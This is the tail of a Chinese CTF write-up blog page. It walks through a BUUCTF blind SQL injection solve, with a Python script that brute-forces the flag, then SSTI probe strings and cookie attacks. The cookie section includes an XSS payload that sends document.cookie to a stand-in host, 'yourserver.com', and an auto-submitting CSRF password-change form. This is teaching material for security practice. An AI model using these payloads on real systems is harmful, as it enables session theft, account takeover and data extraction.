+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">这里粘贴一些用于Fuzz的字典
+</span></span><span class="line"><span class="cl">https://github.com/Underwood12/FuzzDict
+</span></span><span class="line"><span class="cl">这是Fuzz教程  
+</span></span><span class="line"><span class="cl">https://www.bilibili.com/video/BV1Zs42137tf
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>题目给库名和表名都是flag
+所以用<em>id=0^(ascii(substr((select(flag)from(flag)),1,1))&gt;101)</em>
+来查询，由于当&gt;102的时候报错，说明第一个字符就是102的ascii所对应的字符，也就是f
+然后使用脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">plaintext</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://bdff4bff-23c2-43c2-969e-74bedf958792.node3.buuoj.cn/index.php&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">num</span> <span class="o">=</span> <span class="mi">0</span>  <span class="c1"># 用了来判断是不是flag已经拼完整了</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">60</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">num</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">128</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;if(ascii(substr((select(flag)from(flag)),</span><span class="si">%d</span><span class="s2">,1))=</span><span class="si">%d</span><span class="s2">,1,2)&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># print(str((i-1)*96+j-32)+&#34;:~&#34;+payload+&#34;~&#34;)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">apparent_encoding</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;Hello&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">x</span> <span class="o">=</span> <span class="n">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">result</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;}&#34;</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">num</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到flag</p>
+<h1 id="ssti">SSTI
+</h1><p>做了一道BUUCTF题，接触了许多新的知识点。在这里记录一下
+题目在这：</p>
+<blockquote>
+<p>👉 [BJDCTF2020 题目链接](<a class="link" href="https://buuoj.cn/challenges#[BJDCTF2020]Cookie"  target="_blank" rel="noopener"
+    >https://buuoj.cn/challenges#[BJDCTF2020]Cookie</a> is so stable)</p></blockquote>
+<h2 id="1ssti">1.SSTI
+</h2><p>SSTI是这道题所考察的知识点，所以写在最前面</p>
+<h3 id="如何判断是ssti">如何判断是SSTI
+</h3><p>众所周知，SSTI是利用服务器模板漏洞，在模板引擎中注入恶意代码来进行攻击。
+所以我们可以通过输入一些特殊的“探针”，观察服务器响应的变化来判断是否存在SSTI
+常见的SSTI探针：</p>
+<p>​    {{7<em>7}}               # Jinja2, Nunjucks, Twig等    ${7</em>7}                # JSP, Freemarker, Spring    &lt;%= 7 * 7 %&gt;          # EJS (Embedded JavaScript)    #{7*7}                # Thymeleaf</p>
+<p>我们可以在输入框、URL参数、HTTP头、Cookies等位置尝试输入这些探针。然后查看页面返回里有没有49，如果有49，说明这里执行成功了，则存在SSTI漏洞</p>
+<p>不同的模板中使用不同的注入格式</p>
+<ul>
+<li><strong>Jinja2 和 Twig</strong>: 使用 <code>{{ }}</code></li>
+<li><strong>Freemarker 和 Spring</strong>: 使用 <code>${ }</code></li>
+<li><strong>EJS</strong>: 使用 <code>&lt;%= %&gt;</code></li>
+<li><strong>Thymeleaf</strong>: 使用 <code>#{ }</code>
+有时候会对大括号之类的进行过滤，所以可以用Unicode进行绕过</li>
+</ul>
+<blockquote>
+<p>👉 <a class="link" href="https://forum.butian.net/share/1371"  target="_blank" rel="noopener"
+    >SSTI 利用的文章</a></p></blockquote>
+<h2 id="2这道题提示查看cookie看看能从cookie中突破的还有什么">2.这道题提示查看Cookie，看看能从Cookie中突破的还有什么？
+</h2><p>Cookie可以从以下方面入手
+1.HttpOnly、Secure、SameSite 标志：如果Cookie没有设置这些标志，可能可以通过XSS攻击窃取Cookie。
+2.弱JWT签名：如果JWT使用弱的对称加密密钥（如 secret）或无签名 (none algorithm)，可以直接伪造JWT。
+3.客户端验证：CTF中常见的“role=guest”→“role=admin”权限提升。
+4.会话固定 (Session Fixation)：如果你能控制Session ID，可能可以冒充管理员。</p>
+<p>这里详细写一下第一点和第二点</p>
+<p>一、HttpOnly、Secure、SameSite 标志
+我们可以使用F12打开控制台，然后在应用程序 (Application)”→“存储 (Storage)”→“Cookies”中，检查Cookie的属性：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">HttpOnly：如果未启用，可能可以通过XSS攻击来窃取Cookie。
+</span></span><span class="line"><span class="cl">Secure：如果未启用，可能会在HTTP而不是HTTPS上传输Cookie。
+</span></span><span class="line"><span class="cl">SameSite：如果为None，可能可用于CSRF攻击。  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="1-利用-httponly">1. 利用 HttpOnly
+</h4><p>开启HttpOnly则禁止通过JavaScript访问Cookie  如果这里是关的，那就可以</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">plaintext
+</span></span><span class="line"><span class="cl">&lt;script&gt;fetch(&#39;http://yourserver.com/steal?cookie=&#39; + document.cookie);&lt;/script&gt;    
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过钓鱼的方式来获取管理员的会话ID</p>
+<h4 id="2-利用未设置-secure-的-cookie">2. 利用未设置 Secure 的 Cookie
+</h4><p>使用Burp Suite或Wireshark进行抓包。
+在HTTP请求中，寻找Cookie: PHPSESSID=xxxx。
+如果会话ID出现在HTTP请求中，而不是HTTPS中，则可以劫持会话。
+如果题目考察是中间人攻击 (MITM)，你可以使用Wireshark来捕获Cookie：
+过滤器：http.cookie。
+查找“Set-Cookie”或“Cookie”字段中的会话ID。</p>
+<h4 id="3-利用不安全的-samesite-属性">3. 利用不安全的 SameSite 属性
+</h4><p>如果SameSite标志为None，则跨站请求可以携带会话ID。
+这使得CSRF攻击成为可能。
+在攻击者的网站（比如 http:/ /evil.com）上放置以下表单：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">plaintext
+</span></span><span class="line"><span class="cl">&lt;form action=&#34;http ://victim.com/change_password.php&#34; method=&#34;POST&#34;&gt;
+</span></span><span class="line"><span class="cl">  &lt;input type=&#34;hidden&#34; name=&#34;password&#34; value=&#34;newpassword123&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;/form&gt;
+</span></span><span class="line"><span class="cl">&lt;script&gt;document.forms[0].submit();&lt;/script&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果受害者访问evil. com，表单会在受害者的会话中自动提交。</p>
+<p>如果SameSite=None，浏览器会将受害者的会话ID (PHPSESSID) 自动携带到请求中，管理员的身份将被利用。</p></blockquote>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">原型链污染</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Python沙箱逃逸</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Python反序列化</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/rcexss/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">RCE，XSS</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2024 - 
+        
+        2025 Example Person
+    </section>
+    
+    <section class="powerby">
+        
+            Build by Oight <br/>
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
